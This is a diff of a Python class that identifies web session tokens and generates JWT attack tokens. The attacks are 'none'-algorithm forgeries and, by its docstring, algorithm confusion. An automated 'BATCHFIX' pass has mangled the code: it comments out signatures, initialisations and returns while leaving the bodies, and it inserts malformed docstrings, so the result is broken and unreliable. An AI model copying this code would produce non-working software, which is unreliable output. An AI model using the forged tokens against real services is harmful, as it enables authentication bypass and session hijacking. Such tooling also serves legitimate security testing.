@@ -23,35 +23,55 @@ from typing import Optional, Dict, List
 
 
 class SessionIntelligence:
-    """
-    Identifies and analyzes session cookies/tokens for common frameworks.
-    Refactored from badsecrets.
-    """
+# [BATCHFIX] Commented metadata/non-Python
+#     pass  # [BATCHFIX] inserted for empty class
+"""Identifies and analyzes session cookies/tokens for common frameworks."""
+#     Refactored from badsecrets.
+# #
 
     PATTERNS = {
-        "flask": re.compile(r"eyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*"),
-        "django": re.compile(r"^[\.a-zA-z-0-9]+:[\.a-zA-z-0-9:]+$"),
-        "jwt": re.compile(r"^ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*$"),
-        "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$"),
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "flask": re.compile(reyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*"),"  # [BATCHFIX] closed string
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "django": re.compile(r"^[\.a-zA-z-0-9]+:[\.a-zA-z-0-9:]+$"),
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "jwt": re.compile(r"^ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*$"),
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$"),
     }
 
     @classmethod
-    def identify_session(cls, cookie_value: str) -> Optional[str]:
-        """Identifies the type of session token based on regex patterns."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def identify_session(cls, cookie_value: str) -> Optional[str]:
+""""Identifies the type of session token based on regex patterns."""
         for name, pattern in cls.PATTERNS.items():
             if pattern.match(cookie_value):
                 return name
         return None
 
     @staticmethod
-    def generate_jwt_attacks(token: str, public_key: Optional[str] = None) -> List[str]:
-        """
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def generate_jwt_attacks(token: str, public_key: Optional[str] = None) -> List[str]:
         Generates JWT algorithm confusion and 'none' attack tokens.
         Ported from 0xSojalSec-Confusional.
-        """
+# #
         parts = token.split(".")
         if len(parts) != 3:
-            return []
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #             return []
 
         header_b64, payload_b64, signature_b64 = parts
         try:
@@ -62,12 +82,21 @@ class SessionIntelligence:
             header_json = json.loads(b64_decode(header_b64).decode())
             _ = header_json  # Mark as used via variable
         except Exception:
-            return []
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #             return []
 
-        attacks = []
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         attacks = []
 
         # 1. Algorithm 'none'
-        none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]
         for nh in none_headers:
             h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")
             attacks.append(f"{h_b64}.{payload_b64}.")
@@ -87,13 +116,22 @@ class SessionIntelligence:
         return attacks
 
     @classmethod
-    def decode_flask_cookie(cls, cookie: str) -> Optional[Dict]:
-        """Decodes the payload part of a Flask session cookie without verification."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def decode_flask_cookie(cls, cookie: str) -> Optional[Dict]:
+""""Decodes the payload part of a Flask session cookie without verification."""
         try:
             # Flask cookies are serialized with itsdangerous (base64 of json)
-            # Format: .[base64_payload].[sig] or [base64_payload].[sig]
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #             # Format: .[base64_payload].[sig] or [base64_payload].[sig]
             parts = cookie.split(".")
-            payload = parts[0] if not cookie.startswith(".") else parts[1]
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #             payload = parts[0] if not cookie.startswith(".") else parts[1]
 
             # Add padding
             payload += "=" * (4 - len(payload) % 4)
